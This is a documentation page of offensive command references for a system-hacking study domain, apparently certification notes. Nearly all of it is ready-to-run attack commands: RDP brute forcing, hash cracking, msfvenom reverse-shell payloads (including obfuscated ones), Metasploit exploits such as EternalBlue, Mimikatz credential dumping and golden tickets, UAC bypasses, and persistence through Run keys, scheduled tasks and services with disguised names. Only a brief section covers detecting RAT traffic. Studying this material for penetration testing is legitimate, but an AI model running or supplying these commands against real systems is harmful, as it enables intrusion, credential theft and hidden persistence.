---
layout: default
title: Commands
parent: Domain 2 - System Hacking & Exploitation
grand_parent: Domains
nav_order: 1
---

# Domain 2: Commands Reference

## RDP Cracking

```bash
hydra -l Administrator -P rockyou.txt rdp://192.168.1.50
hydra -l admin -P password_list.txt rdp://192.168.1.50:3389
hydra -L usernames.txt -P passwords.txt rdp://192.168.1.5
hydra -l admin -P passwords.txt rdp://192.168.1.5 -v
hydra -l admin -P passwords.txt rdp://192.168.1.5 -f
```

## Hash Cracking

```bash
hashid hash_value
hashcat -m 0 -a 0 hashfile rockyou.txt           # MD5
hashcat -m 100 -a 0 hashfile rockyou.txt         # SHA1
hashcat -m 1400 -a 0 hashfile rockyou.txt        # SHA256
hashcat -m 1000 -a 0 hashfile rockyou.txt        # NTLM
john hashes.txt --wordlist=rockyou.txt
john --show hashes.txt
```

## SMB Exploitation

```bash
smbclient //192.168.1.5/Documents -U admin%password123
smbclient -L 192.168.1.5 -U admin%password123
```

## Msfvenom - Payload Generation

```bash
# Windows reverse shell (EXE)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > backdoor.exe

# Linux reverse shell (ELF)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > linux_shell

# Windows batch file
msfvenom -p windows/cmd/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f bat > shell.bat

# With encoder (obfuscation)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > obfuscated.exe
```

## Msfconsole - Metasploit Framework

```bash
msfconsole
msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST 192.168.1.100
msf> set LPORT 4444
msf> run
```

## Meterpreter Session Commands

```bash
sessions -l                             # List active sessions
sessions -i 1                           # Interact with session 1
background                             # Background current session
jobs -l                                 # List running jobs
jobs -i 1                              # Interact with background job

getuid                                 # Current user
sysinfo                                # System info
ipconfig                               # Network config
ps                                     # List processes
kill PID                               # Kill process

pwd                                    # Current directory
ls                                     # List files
download file.txt /tmp/                # Download file
upload /tmp/evil.exe c:\windows\temp\  # Upload file

execute -f cmd.exe -i                  # Interactive command shell
reg query HKLM\\Software\\Microsoft\\Windows\\Run
reg set HKLM\\Software\\Microsoft\\Windows\\Run "Svchost" "c:\windows\temp\evil.exe"
```

## Detecting RAT Connections

In Wireshark:
```
Filter: ip.src == 192.168.1.50 && tcp.dstport != 80,443,53
Look for: Persistent connections to external IPs on unusual ports
```

In tcpdump:
```bash
tcpdump -i eth0 "src 192.168.1.50 and dst not 192.168.0.0/16" -vv
```

---

## Metasploit Framework - Exploit Search & Usage

```bash
# Launch msfconsole
msfconsole

# Search for exploits by type
search type:exploit platform:windows smb
search type:exploit eternalblue
search type:exploit ssh

# Use specific exploit
use exploit/windows/smb/ms17_010_eternalblue
use exploit/linux/samba/is_known_pipename
use exploit/ssh/libssh_auth_bypass

# View exploit options
show options
show targets

# Set exploit parameters
set RHOSTS 192.168.1.10
set RHOST 192.168.1.10
set LHOST 192.168.1.100
set LPORT 4444
set PAYLOAD windows/meterpreter/reverse_tcp

# Execute exploit
exploit
run
check    # Check if target is vulnerable

# List available payloads
show payloads
```

## Post-Exploitation Modules

```bash
# In meterpreter session
use post/windows/gather/hashdump
use post/windows/escalate/getsystem
use post/windows/gather/credentials/credential_collector
use post/windows/manage/enable_rdp

# Run module
run

# Background and switch sessions
background
sessions -l
sessions -i [id]
```

---

## Mimikatz - Windows Credential Harvesting

```bash
# Enable debug privileges (required for many operations)
mimikatz.exe
privilege::debug

# Dump SAM hashes (local accounts)
lsadump::sam

# Dump LSA secrets (domain info, cached credentials)
lsadump::lsa /inject
lsadump::lsa /patch

# Dump logon passwords (plaintext, if available)
sekurlsa::logonpasswords

# Token impersonation (use other user's credentials)
token::list
token::impersonate /user:DOMAIN\Administrator

# Kerberos ticket operations
kerberos::list
kerberos::ask /ticket:TGT    # Request Kerberos ticket
kerberos::ptt /ticket:ticket.kirbi  # Pass the Ticket attack

# DCSync (sync with Domain Controller - requires high privilege)
lsadump::dcsync /user:DOMAIN\Administrator

# Golden Ticket (create forged Kerberos ticket)
privilege::debug
token::elevate
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /krbtgt:hash /ptt
```

---

## Windows Privilege Escalation

### Service Exploitation - Unquoted Paths
```bash
# Identify services with unquoted paths
wmic service list brief | findstr /i "auto"
Get-WmiObject win32_service | Select Name,PathName | Where {$_.PathName -notlike '"*' -and $_.PathName -notlike "C:\Windows*"}

# If path is C:\Program Files\Application\Service.exe and writable
# Place malicious exe at C:\Program Files\Application.exe
# On next reboot, privilege escalation occurs

# Reboot required
shutdown /r /t 0
```

### Service Permissions - Weak DACL
```bash
# Check service permissions (using accesschk or PowerShell)
accesschk.exe -uwcqv "Authenticated Users" "C:\Program Files\*"

# Query service config
sc qc ServiceName

# If modifiable, change binary path
sc config VulnerableService binPath= "C:\path\to\malware.exe"

# Stop and restart service
net stop VulnerableService
net start VulnerableService
```

### DLL Injection via Services
```bash
# Find writable directory in service path
C:\Program Files\App\bin\ (writable)

# Create malicious DLL, place in path
# Service loads DLL with SYSTEM privileges

# Example: msfvenom for DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll > evil.dll
```

### UAC Bypass - FodHelper
```bash
# FODHelper registry bypass (Win 10+)
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d ""
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\path\to\malware.exe" /f
fodhelper.exe

# EventViewer bypass
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /d "C:\path\to\malware.exe" /f
eventvwr.exe
```

### Kernel Exploitation (Local Privilege Escalation)
```bash
# Identify vulnerabilities
systeminfo
wmic qfe list brief | find "KB"

# Search exploit-db for KB numbers
# Common: MS16-032, MS17-010 (EternalBlue), CVE-2019-1385
```

---

## Post-Exploitation Persistence

### Registry Run Key
```bash
# Add to startup
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "UpdateService" /t REG_SZ /d "C:\windows\temp\malware.exe"

# Hidden run key
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v "Service" /t REG_SZ /d "C:\windows\temp\malware.exe"

# User hive (less suspicious)
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "UserApp" /t REG_SZ /d "C:\users\username\appdata\malware.exe"
```

### Scheduled Task Persistence
```bash
# Create scheduled task (runs at logon)
schtasks /create /tn "SystemUpdate" /tr "C:\path\to\malware.exe" /sc onlogon /ru System

# Create scheduled task (runs every hour)
schtasks /create /tn "Windows Maintenance" /tr "C:\windows\temp\payload.exe" /sc hourly

# Create scheduled task (runs at startup)
schtasks /create /tn "Service" /tr "C:\malware.exe" /sc onstart /ru System

# Verify tasks
schtasks /query /tn "SystemUpdate"

# Delete task
schtasks /delete /tn "SystemUpdate" /f
```

### Service Installation
```bash
# Create Windows service (runs with SYSTEM privileges)
sc create "UpdateService" binPath= "C:\windows\temp\malware.exe"

# Set service to auto-start
sc config "UpdateService" start= auto

# Start service
net start "UpdateService"

# Query service
sc qc "UpdateService"

# Delete service
sc delete "UpdateService"
```

### Startup Folder
```bash
# Copy to startup folder (runs at logon)
copy malware.exe "C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

# All users startup
copy malware.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

## Domain Controller Compromise

### Golden Ticket (Post-Domain Admin)
```bash
# Requires: Domain Admin + Domain Controller hash
mimikatz.exe
privilege::debug
token::elevate

# Get krbtgt hash
lsadump::dcsync /user:DOMAIN\krbtgt

# Create golden ticket
kerberos::golden /user:FakeAdmin /domain:DOMAIN.COM /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:KRBTGT_HASH /ptt

# Ticket valid for 10 years
```

### Silver Ticket (Service-Specific)
```bash
# Forge ticket for specific service
kerberos::silver /user:Administrator /domain:DOMAIN.COM /sid:S-1-5-21-... /service:CIFS /server:DC01 /rc4:SERVICE_HASH /ptt
```
